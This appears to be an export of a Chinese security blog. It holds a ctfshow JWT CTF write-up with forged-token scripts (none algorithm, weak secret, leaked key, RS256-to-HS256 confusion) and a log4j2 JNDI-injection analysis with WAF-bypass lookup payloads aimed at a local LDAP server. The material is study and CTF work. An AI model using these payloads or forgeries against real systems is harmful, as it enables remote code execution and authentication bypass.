<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">header</span><br><span class="line">&#123;</span><br><span class="line">  &#x27;typ&#x27;: &#x27;JWT&#x27;,</span><br><span class="line">  &#x27;alg&#x27;: &#x27;HS256&#x27;  // 加密算法</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload</span><br><span class="line">&#123;</span><br><span class="line">  &quot;sub&quot;: &quot;1234567890&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;John Doe&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">signature</span><br><span class="line">由前面两部分base64加密后用.连接并进行header中声明的方式去加密</span><br></pre></td></tr></table></figure>
<p>jwt就是上面三个通过.进行连接<br>jwt解密网站<br><a href="https://jwt.io/">https://jwt.io/</a></p>
<h2 id="web345"><a href="#web345" class="headerlink" title="web345"></a>web345</h2><p>通过base64解码得到的cookie<br><code>eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE2NzAxODc4NTEsImV4cCI6MTY3MDE5NTA1MSwibmJmIjoxNjcwMTg3ODUxLCJzdWIiOiJ1c2VyIiwianRpIjoiOTVhZDIwMzA1NTY2NmE2ZDBhZjBiY2M2NDc5OTMwYmIifV0</code><br>得到<br><code>&#123;&quot;alg&quot;:&quot;None&quot;,&quot;typ&quot;:&quot;jwt&quot;&#125;[&#123;&quot;iss&quot;:&quot;admin&quot;,&quot;iat&quot;:1670187851,&quot;exp&quot;:1670195051,&quot;nbf&quot;:1670187851,&quot;sub&quot;:&quot;user&quot;,&quot;jti&quot;:&quot;95ad203055666a6d0af0bcc6479930bb&quot;&#125;]</code><br>将user改成admin以后在进行加密<br><code>eyJhbGciOiJOb25lIiwidHlwIjoiand0In0AW3siaXNzIjoiYWRtaW4iLCJpYXQiOjE2NzAxODc4NTEsImV4cCI6MTY3MDE5NTA1MSwibmJmIjoxNjcwMTg3ODUxLCJzdWIiOiJhZG1pbiIsImp0aSI6Ijk1YWQyMDMwNTU2NjZhNmQwYWYwYmNjNjQ3OTkzMGJiIn1d</code><br>并用此cookie去访问/admin，就行了</p>
<h2 id="web346"><a href="#web346" class="headerlink" title="web346"></a>web346</h2><p>通过 <a href="https://jwt.io/">https://jwt.io/</a> 进行解密<br>修改为admin后，猜测密钥是123456，并重新加密<br><img src="/2022/12/05/ctfshow-jwt/1.jpg" alt></p>
<h2 id="web347"><a href="#web347" class="headerlink" title="web347"></a>web347</h2><p>与web346相同，密钥也相同</p>
<h2 id="web348"><a href="#web348" class="headerlink" title="web348"></a>web348</h2><p>通过脚本爆破<br><a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p>
<h2 id="we349"><a href="#we349" class="headerlink" title="we349"></a>we349</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>()+<span class="string">&#x27;//public//private.key&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">user</span>: <span class="string">&#x27;user&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;RS256&#x27;</span> &#125;);</span><br><span class="line">  res.<span class="title function_">cookie</span>(<span class="string">&#x27;auth&#x27;</span>,token);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag?&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>,<span class="keyword">function</span>(<span class="params">req,res,next</span>)&#123;</span><br><span class="line">	<span class="keyword">var</span> flag=<span class="string">&quot;flag_here&quot;</span>;</span><br><span class="line">	res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">	<span class="keyword">var</span> auth = req.<span class="property">cookies</span>.<span class="property">auth</span>;</span><br><span class="line">	<span class="keyword">var</span> cert = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>()+<span class="string">&#x27;//public/public.key&#x27;</span>);  <span class="comment">// get public key</span></span><br><span class="line">	jwt.<span class="title function_">verify</span>(auth, cert, <span class="keyword">function</span>(<span class="params">err, decoded</span>) &#123;</span><br><span class="line">	  <span class="keyword">if</span>(decoded.<span class="property">user</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">	  	res.<span class="title function_">end</span>(flag);</span><br><span class="line">	  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	  	res.<span class="title function_">end</span>(<span class="string">&#x27;you are not admin&#x27;</span>);</span><br><span class="line">	  &#125;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>由get的路由，可以知道通过private.key对jwt进行加密<br>我们访问/private.key，拿到私钥<br>通过python进行加密<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pip install pyjwt</span></span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">public = <span class="built_in">open</span>(<span class="string">&#x27;private.key&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">payload=&#123;<span class="string">&quot;user&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(jwt.encode(payload, key=public, algorithm=<span class="string">&#x27;RS256&#x27;</span>))</span><br><span class="line"><span class="comment"># eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.NoE2xAUmDyHc0rhNtNtUn8URhEZeFGy9M0hd7hBEfRD3jpGqetn0nj2Tm9mob9LWyl2BazTLm_1Ez1vn0A6ZxgcpF73B6_rE4zrDvyu3b6eH3FtwmKd9I6N0KzkO1IpTggRVy6l4RoQCoG4JJ6X9YVJgOWtm0vgWzcjjXejlEsM</span></span><br></pre></td></tr></table></figure></p>
<h2 id="web250"><a href="#web250" class="headerlink" title="web250"></a>web250</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>()+<span class="string">&#x27;//routes/private.key&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">user</span>: <span class="string">&#x27;user&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;RS256&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line">  res.<span class="title function_">cookie</span>(<span class="string">&#x27;auth&#x27;</span>,token);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag?&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>,<span class="keyword">function</span>(<span class="params">req,res,next</span>)&#123;</span><br><span class="line">	<span class="keyword">var</span> flag=<span class="string">&quot;flag_here&quot;</span>;</span><br><span class="line">	res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">	<span class="keyword">var</span> auth = req.<span class="property">cookies</span>.<span class="property">auth</span>;</span><br><span class="line">	<span class="keyword">var</span> cert = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>()+<span class="string">&#x27;//routes/public.key&#x27;</span>);  <span class="comment">// get public key</span></span><br><span class="line">	jwt.<span class="title function_">verify</span>(auth, cert,<span class="keyword">function</span>(<span class="params">err, decoded</span>) &#123;</span><br><span class="line">	  <span class="keyword">if</span>(decoded.<span class="property">user</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">	  	res.<span class="title function_">end</span>(flag);</span><br><span class="line">	  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	  	res.<span class="title function_">end</span>(<span class="string">&#x27;you are not admin&#x27;</span>+err);</span><br><span class="line">	  &#125;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>这里只能获取到public.key，这时候可以更改RS256为HS256，在后端进行校验的时候就会使用HS256进行验证，且我们知道密钥为public.key<br>利用nodejs进行加密，保证版本相同<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;public.key&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">user</span>: <span class="string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span> &#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(token)</span><br></pre></td></tr></table></figure></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://blog.csdn.net/miuzzx/article/details/111936737">https://blog.csdn.net/miuzzx/article/details/111936737</a></li>
<li><a href="https://xz.aliyun.com/t/2338">https://xz.aliyun.com/t/2338</a></li>
</ul>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>jwt</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>log4j2 分析</title>
    <url>/2023/03/08/log4j2-%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>其实我总感觉这应该不属于漏洞，应该是他们的正常功能，只不过恰好可以被当成漏洞来用<br><a href="https://logging.apache.org/log4j/log4j-2.7/manual/lookups.html#JndiLookup">https://logging.apache.org/log4j/log4j-2.7/manual/lookups.html#JndiLookup</a><br>官网也有相关的介绍，虽然这些是写到配置文件里面的<br><span id="more"></span></p>
<h2 id="前期配置"><a href="#前期配置" class="headerlink" title="前期配置"></a>前期配置</h2><h3 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="trustURLCodebase"><a href="#trustURLCodebase" class="headerlink" title="trustURLCodebase"></a>trustURLCodebase</h3><p>因为漏洞核心是lookup参数可控，那么就属于jndi注入，需要低版本jdk，或者开启trustURLCodebase<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, String.valueOf(<span class="literal">true</span>));</span><br><span class="line">System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, String.valueOf(<span class="literal">true</span>)); </span><br></pre></td></tr></table></figure><br>当然也可以利用本地gadget，这属于jndi注入的知识，这里不做过多讨论</p>
<h3 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(test.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        logger.fatal(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1/exploit&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">lookup:172, JndiManager (org.apache.logging.log4j.core.net)</span><br><span class="line">lookup:56, JndiLookup (org.apache.logging.log4j.core.lookup)</span><br><span class="line">lookup:221, Interpolator (org.apache.logging.log4j.core.lookup)</span><br><span class="line">resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">format:38, PatternFormatter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">toSerializable:344, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout)</span><br><span class="line">toText:244, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:229, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:59, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender:84, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenders:540, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">processLogEvent:498, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:481, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:456, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:63, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config)</span><br><span class="line">log:161, Logger (org.apache.logging.log4j.core)</span><br><span class="line">tryLogMessage:2205, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageTrackRecursion:2159, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageSafely:2142, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessage:2017, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logIfEnabled:1983, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">fatal:1053, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">main:10, test</span><br></pre></td></tr></table></figure>
<h3 id="MessagePatternConverter"><a href="#MessagePatternConverter" class="headerlink" title="MessagePatternConverter"></a>MessagePatternConverter</h3><p>从<br><code>format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern)</code><br>开始看起<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> offset; i &lt; workingBuilder.length() - <span class="number">1</span>; i++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (workingBuilder.charAt(i) == <span class="string">&#x27;$&#x27;</span> &amp;&amp; workingBuilder.charAt(i + <span class="number">1</span>) == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> workingBuilder.substring(offset, workingBuilder.length());</span><br><span class="line">                        workingBuilder.setLength(offset);</span><br><span class="line">                        workingBuilder.append(config.getStrSubstitutor().replace(event, value));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure><br>分析第二行可以知道，如果遇到<code>$&#123;</code>，就会进入判断语句，而这个workingBuilder和logger.fatal()的参数相关，换句话说，基本上workingBuilder就是logger.fatal()中的参数，只不过类型被转换了一下，原本是String，现在是StringBuilder类。<br>继续往下走，进入replace<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">replace</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String source)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (source == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">StringBuilder</span> <span class="variable">buf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(source);</span><br><span class="line">    <span class="keyword">if</span> (!substitute(event, buf, <span class="number">0</span>, source.length())) &#123;</span><br><span class="line">        <span class="keyword">return</span> source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> buf.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>来到了漏洞核心点substitue()</p>
<h3 id="substitue"><a href="#substitue" class="headerlink" title="substitue"></a>substitue</h3><p>接下来会逐段分析该函数中重要的代码段<br><img src="/2023/03/08/log4j2-%E5%88%86%E6%9E%90/1.jpg" alt><br>在这里会先进行判断，如果在代码中还存在<code>$&#123;</code>，就会进入递归，在里面进行再一次解析，这段先放放，继续往下看</p>
<p><img src="/2023/03/08/log4j2-%E5%88%86%E6%9E%90/2.jpg" alt><br>在这里valueDelimiterMatcher是<code>[:,-]</code><br>也就是说如果匹配到了:-就会进入循环语句，并进行一次切割处理<br>比如aaa:-bbb，<br>前面的aaa会被赋值给varName<br>后面的值bbb会被赋值给varDefaultValue<br>接着往下走<br><img src="/2023/03/08/log4j2-%E5%88%86%E6%9E%90/3.jpg" alt><br>先不详细介绍resolveVariable，只需要知道如果是类似前面<code>aaa:-bbb</code>这样的值没什么特殊意义的值，会直接返回null，那么就会把varDefaultValue赋值给varValue，也就是bbb，而下面的代码大意就是把buf用varValue进行了部分替换<br>如果payload原本是<br><code>$&#123;jndi:ldap://127.0.0.1/$&#123;abc:-exp&#125;loit&#125;</code><br>那么就会被替换成<br><code>$&#123;jndi:ldap://127.0.0.1/exploit&#125;</code></p>
<p>那么回到刚刚开始那个递归的地方<br><img src="/2023/03/08/log4j2-%E5%88%86%E6%9E%90/1.jpg" alt><br>varNameExpr就会被赋值为被替换过的payload接着解析</p>
<h3 id="resolveVariable"><a href="#resolveVariable" class="headerlink" title="resolveVariable"></a>resolveVariable</h3><p>接下来重点讲下resolveVariable，这里是触发jndi注入的关键<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> String <span class="title function_">resolveVariable</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String variableName, <span class="keyword">final</span> StringBuilder buf,</span></span><br><span class="line"><span class="params">                                    <span class="keyword">final</span> <span class="type">int</span> startPos, <span class="keyword">final</span> <span class="type">int</span> endPos)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">StrLookup</span> <span class="variable">resolver</span> <span class="operator">=</span> getVariableResolver();</span><br><span class="line">    <span class="keyword">if</span> (resolver == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> resolver.lookup(event, variableName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这里的resolver可以看相关文档<br><a href="https://logging.apache.org/log4j/log4j-2.7/manual/lookups.html">https://logging.apache.org/log4j/log4j-2.7/manual/lookups.html</a><br>进入这个lookup中<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">lookup</span><span class="params">(<span class="keyword">final</span> LogEvent event, String <span class="keyword">var</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">var</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">prefixPos</span> <span class="operator">=</span> <span class="keyword">var</span>.indexOf(PREFIX_SEPARATOR);</span><br><span class="line">    <span class="keyword">if</span> (prefixPos &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">prefix</span> <span class="operator">=</span> <span class="keyword">var</span>.substring(<span class="number">0</span>, prefixPos).toLowerCase(Locale.US);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="keyword">var</span>.substring(prefixPos + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">StrLookup</span> <span class="variable">lookup</span> <span class="operator">=</span> strLookupMap.get(prefix);</span><br><span class="line">        <span class="keyword">if</span> (lookup <span class="keyword">instanceof</span> ConfigurationAware) &#123;</span><br><span class="line">            ((ConfigurationAware) lookup).setConfiguration(configuration);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (lookup != <span class="literal">null</span>) &#123;</span><br><span class="line">            value = event == <span class="literal">null</span> ? lookup.lookup(name) : lookup.lookup(event, name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (value != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> = <span class="keyword">var</span>.substring(prefixPos + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (defaultLookup != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">return</span> <span class="variable">event</span> <span class="operator">=</span>= <span class="literal">null</span> ? defaultLookup.lookup(<span class="keyword">var</span>) : defaultLookup.lookup(event, <span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>因为会去分割<code>:</code>，那么会根据jndi取出jndi的strLookupMap，最后进行jndi调用</p>
<h2 id="绕waf"><a href="#绕waf" class="headerlink" title="绕waf"></a>绕waf</h2><p>他会根据传入的协议取出相对应的lookup，然后调用，那么就可以有如下的绕过手法<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;$&#123;a:-j&#125;ndi:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=&#125;</span><br><span class="line">$&#123;$&#123;a:-j&#125;n$&#123;::-d&#125;i:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=&#125;</span><br><span class="line">$&#123;$&#123;lower:jn&#125;di:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=&#125;</span><br><span class="line">$&#123;$&#123;lower:$&#123;upper:jn&#125;&#125;di:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=&#125;</span><br><span class="line">$&#123;$&#123;lower:$&#123;upper:jn&#125;&#125;$&#123;::-di&#125;:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><a href="http://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/02.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/01.Java%E5%AE%89%E5%85%A8/03.%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/06.log4j2_rce%E5%88%86%E6%9E%90.html">http://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/02.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/01.Java%E5%AE%89%E5%85%A8/03.%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/06.log4j2_rce%E5%88%86%E6%9E%90.html</a></li>
<li><a href="https://logging.apache.org/log4j/log4j-2.7/manual/lookups.html">https://logging.apache.org/log4j/log4j-2.7/manual/lookups.html</a></li>
</ul>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>java</tag>
        <tag>log4j</tag>
        <tag>jndi</tag>
      </tags>
  </entry>
  <entry>
    <title>基于mvc框架的cms分析(没时间写)</title>
    <url>/2023/02/28/%E5%9F%BA%E4%BA%8Emvc%E6%A1%86%E6%9E%B6%E7%9A%84cms%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<!-- ## MVC的简单理解
基本上网上很多资料是有关于MVC，和类似这张图的
![](1.png)
其实在php中，我审计过的一两个基于MVC框架的phpcms，基本上可以通俗的理解为
+ Model：与数据库相关
+ Controller： 与处理相应的请求有关，也就是会牵扯到路由
+ View：与html有关，就是最后渲染出来的结果

## 分析路由
拿到一个基于MVC框架的phpcms，首先就是要分析他的路由，也就是Controller，一般URL链接都是长这样
`index.php?c=Controller&a=Action&d=do`
+ c代表文件夹
+ a代表文件，
+ d代表文件中的函数 -->]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>php</tag>
        <tag>mvc</tag>
      </tags>
  </entry>
  <entry>
    <title>aliyunctf web</title>
    <url>/2023/04/26/aliyunctf-web/</url>
    <content><![CDATA[<h2 id="ezBean"><a href="#ezBean" class="headerlink" title="ezBean"></a>ezBean</h2><span id="more"></span>
<p>这题本来做出来了，但是本地一直没复现成功（不知道是不是fastjson1.2.60版本的原因）也没想着直接去打poc，就错失了300分</p>
